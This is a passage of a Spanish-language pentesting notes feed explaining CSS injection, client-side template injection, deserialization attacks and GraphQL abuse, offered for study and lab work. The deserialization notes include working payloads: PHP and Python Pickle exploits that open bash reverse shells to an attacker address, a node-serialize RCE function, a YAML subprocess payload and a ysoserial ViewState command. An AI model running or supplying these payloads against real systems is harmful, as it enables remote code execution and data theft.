 <br><br>CSS (Hojas de estilo en cascada) es un lenguaje de programación para diseño gráfico donde se puede definir y crear la presentación de un documento estructurado escrito en un lenguaje de marcado, es decir, para darle estilos y  vida a las aplicaciones web. <br><br><br>Las CSS Injections son un tipo de vulnerabilidad web que permite a un atacante inyectar código CSS malicioso en una página web. Esto ocurre cuando una aplicación web confía en entradas no confiables del usuario y las utiliza directamente en su código CSS, sin realizar una validación adecuada. <br>El código CSS maliciosos inyectado puede alterar el estilo y diseño de la página, permitiendo a los atacantes realizar acciones como la suplantación de identidad o el robo de información confidencial.<br>Las Inyecciones CSS puede ser utilizadas por los atacantes como un vector de ataque para explotar vulnerabilidades de <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a>. Supongamos que una aplicación web permite a los usuarios introducir texto en un campo de entrada que se muestra en un página web. Si el desarrolladores de la aplicación no valida y filtra adecuadamente  el texto introducido por el usuario, un atacante podría inyectar código malicioso en el campo de entrada, incluyendo código JavaScript. <br>Si el código CSS inyectado es lo "suficientemente complejo", puede hacer que el navegador web interprete el código como si fuera código JavaScript. Esto significa que el código CSS maliciosos puede ser utilizad para inyectar código JavaScript en la página web, lo que se conoce como una inyección de JavaScript inducida por CSS (CSS-Induced JavaScript Injection). <br>Una vez que el código JavaScript ha sido inyectado en la página, este puede ser utilizad por el atacante para realizar un ataque de <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a>. Una vez en este punto, el atacante podría ser capaz de inyectar un script malicioso que robe las credenciales del usuario o que los redirija a una página web falsa, entre otros muchos posibles vectores. <br><br><br>Por ejemplo, tenemos una web la cual nos permite ingresar "nuestro color favorito": <br><img alt="CSSI_blue.png" src="https://dobliuw.com/lib/media/cssi_blue.png"><br><img alt="CSSI_green.png" src="https://dobliuw.com/lib/media/cssi_green.png"><br>Si vemos con CTRL + U el código fuente de la página podremos ver que nuestro valor ingresado se carga como valor dentro de la etiqueta &lt;style&gt;: <br><img alt="CSSI_codigo_fuente.png" src="https://dobliuw.com/lib/media/cssi_codigo_fuente.png"><br>Por lo que si el código no esta lo suficientemente validado podríamos inyectar múltiples propiedades CSS o código JavaScript...<br>Por ejemplo múltiples propiedades CSS: <br><br><img alt="CSSI_CSS_props.png" src="https://dobliuw.com/lib/media/cssi_css_props.png"><br>O código JavaScript: <br><br><img alt="CSSI_XSS.png" src="https://dobliuw.com/lib/media/cssi_xss.png"><br>Siendo el código fuente: <br><img alt="CSSI_codigo_fuente_2.png" src="https://dobliuw.com/lib/media/cssi_codigo_fuente_2.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/cssi-(css-injections).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/CSSI - (CSS Injections).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:43:59 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/cssi_blue.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/cssi_blue.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es un <strong>CSTI</strong> ?]]></title><description><![CDATA[ 
 <br><br>El Client-Side Template Injection ( CSTI ) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una plantilla de cliente, que se ejecuta en el navegador del usuario en lugar del servidor. <br>A diferencia del <a data-href="SSTI - (Server-Side Template Injection)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssti-(server-side-template-injection).html" class="internal-link" target="_self" rel="noopener nofollow">SSTI - (Server-Side Template Injection)</a>, en el que la plantilla de servidor se ejecuta en el servidor y es responsable de generar el contenido dinámico, en el CSTI, la plantilla de cliente se ejecuta en el navegador del usuario y se utiliza para generar contenido dinámico en el lado del cliente. <br>Los atacantes puede aprovechar una vulnerabilidad de CSTI para inyectar código malicioso en una platinlla de cliente, lo que les permite ejecutar comandos en el navegador del usuario y obtener acceso no autorizado a la aplicación web y a los datos sensibles. <br>Una deriavión común de un ataque de CSTI es aprovecharlo para realizar un ataque de <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a>. <br>Una vez que un atacante ha inyectado código malicioso en la plantilla del cliente, puede manipular los datos que se muestran al usuario, lo que le permite ejecutar código JavaScrip en el navegador del usuario. A través de este código malicioso, el atacante puede intentar robar la cookie de sesión del usuario, lo que le permitiría obtener acceso no autorizado a la cuenta del usuario y realizar acciones maliciosas en su nombre. <br><br><br>La explotación puede ser muy similar a las <a data-href="SSTI - (Server-Side Template Injection)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssti-(server-side-template-injection).html" class="internal-link" target="_self" rel="noopener nofollow">SSTI - (Server-Side Template Injection)</a> en donde podemos hacer uso de <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">Payload All The Things</a>, con la diferencia que a la hora de intentear ejecutar comandos del lado del servidor o cargar archivos del sistema, no vamos a poder, por lo que posteriormente podemos comenzar a realizar  <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a>. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/csti-(client-side-template-injection).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/CSTI - (Client-Side Template Injection).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:44:05 GMT</pubDate></item><item><title><![CDATA[¿ Que es la <strong>serialización</strong> ?]]></title><description><![CDATA[ 
 <br><br>La serialización es el proceso de cvonvertir un objeto en una secuencia de bytes que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. <br><br><br>Los ataques de deserialización son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de serialización y deserialización de objetos en aplicaciones que utilizan la programacón orientada a objetos (POO)<br>Estos ataques ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> en el servidor. <br>Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras como: <br>
<br>Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso. 
<br>Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
<br>Realizar un ataque de man-in-the-middle para interceptar y modificar el objeto serializado antes de que llegue a la aplicación. 
<br><br><br>Para evitar estos tipos de ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserializaciópn seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para correfir posibles vulnerabilidades. <br><br><br>Estos ataques se pueden aconteser en muchos escenarios, por ejemplo, en aplicaciones web que tratan con NodeJS o PHP, por ejemplo, si detectaramos que la data interceptada con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> viaja de una manera serializada, podriamos comenzar a pensar en un php deserilialisation attack. <br>La data interceptara por ejemplo se ve así:  obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"284781274";}&amp;ip=284781274<br>Y sabemos que por detras el código es el sig: <br>&lt;?php
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	function validate() {
		if (!$this-&gt;isValid) {
			if (filter_var($this-&gt;ipAddress, FILTER_VALIDATE_IP))
			{
				$this-&gt;isValid = True;
			}
		}
		$this-&gt;ping();
	}
	public function ping()
        {
		if ($this-&gt;isValid) {
			$this-&gt;output = shell_exec("ping -c 3 $this-&gt;ipAddress");	
		}
        }
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}
$pingTest-&gt;validate();
Copy<br>Donde, tras analizar el código, podriamos pensar en que si lograramos hacer que el valor de ipAddress sea un comando de bash a la par que isValid sea True, estariamos con la posibilidad de inyectar comandos en el sistema a traves de un Deserialization attack. <br>Podriamos crear un script de php imitando la funcionalidad del código que pudimos ver, para de esta manera recrear un nuevo objeto serializado.<br>&lt;?php 

class pingTest {
	public $ipadress = "; bash -c 'bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1'";
	public $isValid = True; 
	public $output = ""; 
}

echo serialize(new pingTest);
Copy<br>Logrando así, obtener un obj serializado válido el cual nos envía una reverse shell, teniendo así, posiblidad de <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br><br><br><br>Ahora, en un escenario de un node deserialization attack podriamos hacer uso del concepto IIFE (Inmediatly Invoked Function Exression), el cual consiste en la declaración de funciones que son ejecutadas en el mismo momento de la declaración, de manera que, si capturaramos por ejemplo, una cookie la cual es eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=, al decodearle veriamos la sig data serializada: <br>{"username":"dobliuw","country":"india","city":"bangalore"}, mientras que en la web vemos un "Hello dobliuw", podemos deducir que si cambiamos esta data serializada, para que en lugar de donde dice "dobliuw" diga otra cosa que ingresemos nosotros, podrimaos intentar hacer uso de un IIFE para que a la hora de que se deserialize dicha data, se ejecute una instrucción de <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br>const serialize = require('node-serialize'); 

const payload = {
username: function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)},
country: "Argentina",
city: "Buenos Aires"
}

console.log(serialize.serialize(payload))
Copy<br>Esta función, que se encarga de serializar el payload, nos arrojaria lo sig: <br>{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)}","country":"Argentina","city":"Buenos Aires"}<br>De manera que nuestra función _$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)} devera ser invocada indemediatamente agregado () alfinal de esta, <br>IIFE: _$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)}() <br>De esta manera, cuando el servidor deserialize la data, gracias a nuestra IIFE, se ejecutara el comando del lado del servidor, dejandonos así posiblidad de <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br><br><br>Un ataque de Deserialización Yaml (DES-Yaml) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan YAML (Yet Another Markup Language) para serializar y deserializar objetos. <br>La vulnerabilidad se produce cuando un atacantes es capaz de controlar la entrada YAML que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada YAML, puede permitir que un atacante inyecte código malicioso en el objeto deserializado. <br><br>Para explotar un ataque de deserialización cuando reconocemos que esta yaml corriendo por detrás, es importante que, como siempre, hay que tener en cuenta en caso, esto puede ser muy fácil así como difícil dependiendo la sanitización de la aplicación web, entre otros factores.<br>
Existen páginas como <a data-tooltip-position="top" aria-label="https://www.pkmurphy.com.au/isityaml/" rel="noopener nofollow" class="external-link" href="https://www.pkmurphy.com.au/isityaml/" target="_blank">esta</a> en las cuales enseñan como se podría llegar a ejecutar comandos a través de un ataque de deserialización YAML.  <br>Por ejemplo, si tenemos una aplicación la cual corre python y vemos que se nos redirige a una url tal que así: <br>..../eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==<br>Podemos intuir que es una cadena en base64, por lo que si la decodeamos: <br>echo -n "eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==" | base64 -d; echo
Copy<br>Veríamos el output: yaml: The information page is still under construction, updates coming soon!, intuyendo así que por detrás corre YAML. Usando la página previamente mencionada veríamos que para intentar ejecutar comandos en un aplicativo que deserializa información yaml sin validaciones con el payload !!python/object/apply:subprocess.check_output ['&lt;command_to_execute&gt;'].<br>Pudiendo así ejecutar comandos a través de la explotación de la deserialización YAML en python haciendo lo siguiente: <br>echo -n "yaml: !!python/object/apply:subprocess.check_output ['id']" | base64 -w 0; echo 
Copy<br>Y pegando la cadena de base64 como URL podríamos lograr un <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br><br><br>Un ataque de deserialización Pickle (DES-Pickle) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos. <br>La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código maliciosos en el objeto deserializado. <br><br>Supongamos que tenemos una app la cual recibe una cadena hexadecimal en un objeto serializado con Pickle, la convierte a texto legible y la guarda en un archivo sin ningún tipo de validación. <br>En el proceso de deserialización, en Pickle, hay una función llamada reduce la cual podemos controlar para que a la hora de deserializar una data, podemos ingresar a nivel de sistema como queremos que se deserialize o como queremos que se ejecute. Por lo que a la hora de realizar un ataque de deserialización en Pickle mayormente crearíamos un archivo tal que así: <br>import pickle, os, binascii 
# binascii para poder convertir la cadena a hexadecimal.

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i &gt;&amp; /dev/tcp/192.168.1.38/443 0&gt;&amp;1"',))

if __name__ == "__main__": 
    print(binascii.hexlify(pickle.dumps(Exploit())))
Copy<br>Creamos una clase con la función reduce la cual retorna lo que nos interesa que devuelva, en este caso la ejecución de un comando a nivel de sistema. Para posteriormente pesarle a la función pickle.dumps() para mostrar por consola la data serializada (El comando a ejecutar a nivel de sistema). <br><br><br>Podemos obtener la explotación en la de deserialización en aplicaciones ASP.NET a través del campo VIEWSTATE, campo oculto utilizado por ASP.NET para mantener el estado de la página entre solicitudes puede ser firmado y/o encriptado para evitar manipulación, pero en poseción de las claves o con una mala configuración podría ser explotado.<br><br>En algunos casos, los archivos de configuración (como web.config) pueden estar expuestos y accesibles, ya sea por malas configuraciones u otras vulnerabilidades como <a data-href="LFI - (Local File Inclusion)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/lfi-(local-file-inclusion).html" class="internal-link" target="_self" rel="noopener nofollow">LFI - (Local File Inclusion)</a>. Estos archivos pueden encontrarse en la raíz del sistema por defecto, pero también podrían tener una localización diferente, por lo que probar distintas rutas conocidas será necesario.<br>Este archivo alojará las claves de validación y cifrado utilizadas por la aplicación ASP.NET. Estas claves son esenciales si el campo VIEWSTATE está configurado para ser firmado o encriptado. <br>Ejemplo de archivo web.config:<br>&lt;configuration&gt;
	&lt;system.web&gt;
		......
		......
		&lt;machineKey decryption="AES"
decryptionKey="74477CEBDD09D66AD4A8C8B5002A4CF....."
validation="SHA1"
validationKey="56200D3D029F914F4CDF25869D24EC2DA51174....." /&gt;
	&lt;/system.web&gt;
		&lt;system.webServer&gt;
			.......
			.......
		&lt;/system.webServer&gt;
&lt;/configuration&gt;
Copy<br><br>Como sabemos, <a data-tooltip-position="top" aria-label="https://github.com/pwntester/ysoserial.net" rel="noopener nofollow" class="external-link" href="https://github.com/pwntester/ysoserial.net" target="_blank">ysoserial.net</a> es una herramienta para generar payloads y explotar vulnerabilidades en aplicaciones .NET (Object deserialization). Una vez con el contenido del archivo web.config o con la información necesaria del mismo (Claves y Validactiones) y descargado el repositorio de ysoserial con una terminal abierta en el mismo, podríamos proseguir con la creación del payload.<br>
<br>Validar los plugins posibles a utilizar:
<br>ysoserial.exe -p --help
Copy<br>
<br>Listar ejemplos para el uso del plugin ViewState:
<br>ysoserial.exe -p ViewState --examples
Copy<br>
<br>Crear payload para acontecer <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> basado en la información del archivo web.config: 
<br>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{Command 2 execute}" --path="/path/where/is/the/petition/with/viewstate" --apppath="/path/to/the/asp/app" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66AD4A8C8B5002A4CF....." --validationalg="SHA1" --validationkey="56200D3D029F914F4CDF25869D24EC2DA51174...."
Copy<br>El resultado del último comando será un payload en base64 el cual nos permitirá remplazar el contenido original del campo VIEWSTATE y en caso de que todo salga bien, lograríamos la ejecución de comandos exitosamente habiendo abusado de una vulnerabilidad en la deserialización de este campo. Podríamos usar páginas webs como <a data-tooltip-position="top" aria-label="https://www.revshells.com/" rel="noopener nofollow" class="external-link" href="https://www.revshells.com/" target="_blank">revshells</a> las cuales nos permiten crear one-liners para la obtención de reverse shells o bindshells a través de la ejecución de comandos en múltiples terminales o tecnologías.<br><br>&lt;system.web&gt;
    &lt;machineKey validationKey="AutoGenerate,IsolateApps" decryptionKey="AutoGenerate,IsolateApps" validation="SHA1" decryption="AES" /&gt;
    &lt;pages enableViewState="true" viewStateEncryptionMode="Always" /&gt;
&lt;/system.web&gt;
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/deserialization-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Deserialization Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 19:19:08 GMT</pubDate></item><item><title><![CDATA[Firma Digital de cookies]]></title><description><![CDATA[ 
 <br><br>La firma digital de cookies es una técnica de seguridad que garantiza la integridad de los datos almacenados en las cookies. Cuando una cookie se firma digitalmente, se agrega una firma criptográfica a la cookie que se base en un secreto compartido entre el servidor y la aplicación. Esto permite al servidor verificar si la cookie ha sido manipulada por un tercero antes de procesarla. <br><br><br>Los casos de explotación de cookies que son digitalmente firmadas con un "secreto"(key) son varíos, pero uno muy común podría darse en aplicaciones de Express (Framework de Nodejs) en el cual se utilizan herramientas como <a data-tooltip-position="top" aria-label="https://github.com/DigitalInterruption/cookie-monster" rel="noopener nofollow" class="external-link" href="https://github.com/DigitalInterruption/cookie-monster" target="_blank">Cookie-monster</a> para obtener tanto una cookie de "session" como una cookie de "session.sig" la cual se encuentra firmada y el servidor la utiliza para verificar que la cookie "session" no haya sido alterada. <br>Los ataques de cara a este escenario u otros son muy amplios, podría darse el caso de que se utilize un "secreto"(key) debil el cual puede ser probada por fuerza bruta sabiendo los datos de entradas para corroborar cual es la key utilizada, así como podría darse que contemos con un <a data-href="LFI - (Local File Inclusion)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/lfi-(local-file-inclusion).html" class="internal-link" target="_self" rel="noopener nofollow">LFI - (Local File Inclusion)</a> mediante el cual podramos llegar a leer código listando así el secreto.<br>Es importante recordar que podríamos visitar recursos como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express" target="_blank">HackTricks</a> para ver más en profundidad este tipo de ataques.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/digital-cookies-signs.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Digital cookies signs.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:44:13 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>GraphQL</strong> ?]]></title><description><![CDATA[ 
 <br><br>GraphQL es un lenguaje de consultas para APIs (Application Programming Interfaces) que se ha vuelto cada vez más popular en los últimos años. A diferencia de las APIs tradicionales que tiene endpoints fijos, GraphQL permite a los clientes solicitar sólo la información que necesita y obtener una respuesta personalizada en función de sus necesidades. <br><br><br>Introspection en GraphQL es un mecanismo que permite a los clientes obtener información sobre el esquema GraphQL de una API. Esto significa que los clientes pueden explorar y descubrir los tipos de datos, los campos y las relaciones que existen en la API, lo que puede ser muy útil para los desarrolladores que necesitan construir clientes GraphQL. Sin embargo, la introspección también puede ser utilizada por los atacantes para obtener información sensible sobre la estructura y los datos que existen en la API, lo que puede ser utilizado para llevar a cabo ataques más sofisticados. <br><br><br>Las Mutations en GraphQL son operaciones que permiten a los clientes modificar los datos en la API. A diferencia de las consultas, que sólo permiten la lectura de los datos, las mutaciones permiten a los clientes agregar, actualizar o eliminar datos .Esto significa que las mutaciones tiene el potencial de ser utilizadas para realizar cambios importantes en la base de datos subyacente de la API. Si no se protegen adecuadamente, las mutaciones pueden ser explotadas por los atacantes para realizar cambios malintencionados en la API, como la eliminación de datos importantes o la creación de nuevos registros. <br><br><br>En el contexto de GraphQL, los <a data-href="IDORs - ( Insecure Direct Object Reference )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/idors-(-insecure-direct-object-reference-).html" class="internal-link" target="_self" rel="noopener nofollow">IDORs - ( Insecure Direct Object Reference )</a> pueden ocurrir cuando un atacantes es capaz de adivinar o enumerar identificadores (IDs) de objetos dentro de la API, y puede utilizar esos IDs para acceder a objetos a los que no debería tener acceso. Esto puede ocurrir porque los desarrolladores de la API pueden no haber implementado adecuadamente los mecanismos de autenticación y autorización en su API. <br><br><br>
<br>


<br>Por ejemplo a la hora de explotar un <a data-href="IDORs - ( Insecure Direct Object Reference )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/idors-(-insecure-direct-object-reference-).html" class="internal-link" target="_self" rel="noopener nofollow">IDORs - ( Insecure Direct Object Reference )</a> en el contexto de GraphQL, se puede dar debido a una mala configuración de los desarrolladores permitiendo a un usuario enumerar información privada de otros usuarios, por ejemplo...<br>Nos encontramos en una aplicación en donde con una de las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> de enumeración como gobuster encontramos una ruta, supongamos que /settings, en esta lo que vemos es información de nuestra cuenta ( Estando logueados como un usuario ). Si interceptamos esta petición con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> veremos que se tramita una petición de tipo POST a una API de GraphQL en donde por body se envía algo tal que así: <br>{"query":"{ UserInfo (id: 43) {\n          \t\t\t\tapi_key\n          \t\t\t\tname\n          \t\t\t\tsurname\n          \t\t\t\tdate_of_birth\n        \t\t\t\t}\n      \t\t\t}\n        \t\t\t\t"}
Copy<br>Por lo que deducimos que se esta solicitando los campos api_key, name, surname y date_of_birth del user donde el id es 43, por lo que este ID haría referencia a nuestro ID de usuario, por lo que si cambiamos dicho ID por el 1 u otros y recibo los datos de vuelta, estaríamos explotando un <a data-href="IDORs - ( Insecure Direct Object Reference )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/idors-(-insecure-direct-object-reference-).html" class="internal-link" target="_self" rel="noopener nofollow">IDORs - ( Insecure Direct Object Reference )</a> ya que como un usuario no debería poder tener acceso a datos personales de un usuario ajeno. <br><br>
<br>


<br>En la introspection como mencionamos anteriormente, podemos obtener información acerca de la base de datos mediante peticiones de GraphQL, por lo que si viéramos como en el caso anterior, una petición que se lanza hacía una ruta /graphql, ya que esto no deja de ser una API podríamos ver si tenemos la posibilidad de ingresar a esta ruta para interactuar con el apartado de búsqueda de GraphQL: <br><img alt="graphql.png" src="https://dobliuw.com/lib/media/graphql.png"><br>En donde, si hiciéramos uso de páginas como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql" target="_blank">Hack Tricks</a> podríamos obtener querys para enumerar toda la información acerca de la base da datos  (Tablas, campos, etc) como la siguiente query: <br>fragment FullType on __Type {
  kind
  name
  description
  fields {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues {
    name
    description
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }hicieramos
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
Copy<br><br>Una vez tengamos la respuesta de GraphQL con toda la información acerca de las base de datos, simplemente deberíamos copiar dicha información devuelta, para pasarla a un <a data-tooltip-position="top" aria-label="https://github.com/graphql-kit/graphql-voyager" rel="noopener nofollow" class="external-link" href="https://github.com/graphql-kit/graphql-voyager" target="_blank">proyecto de GitHub</a> (El cual tiene <a data-tooltip-position="top" aria-label="https://graphql-kit.com/graphql-voyager/" rel="noopener nofollow" class="external-link" href="https://graphql-kit.com/graphql-voyager/" target="_blank">Live Mode</a>) donde podríamos ver de una manera más visual la administración de la/s base de dato/s: <br><img alt="LiveMode_graphql-kit.png" src="https://dobliuw.com/lib/media/livemode_graphql-kit.png"><br>Una vez entendida la administración de la/s base/s de dato/s, podríamos realizar peticiones más especificas para enumerar información sensible de usuarios, obtener contraseñas, ID's , etc. <br># Si me interesara ver el ID, username y si es administrador en base al ejemplo anterior dado: 
{"query":"{Users{id, username, isAdmin}}"}
Copy<br><br>
<br>


<br>Por ultimo, como vimos, las mutations son interacciones con GraphQL que permiten al usuario modificar, agregar o eliminar datos, por ejemplo, si siguiendo el ejemplo dado tuviéramos un botón de crear post, en donde podríamos crear un "post" con un titulo, mensaje, etc. si lo interceptáramos con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> veríamos algo como lo siguiente: <br>{
	"query":"mutation { createPost(title: \"I'm the best hacker in this fucking life\", body: \"Bye\", author_id: 1) { id, title, body, author_id }}"
}
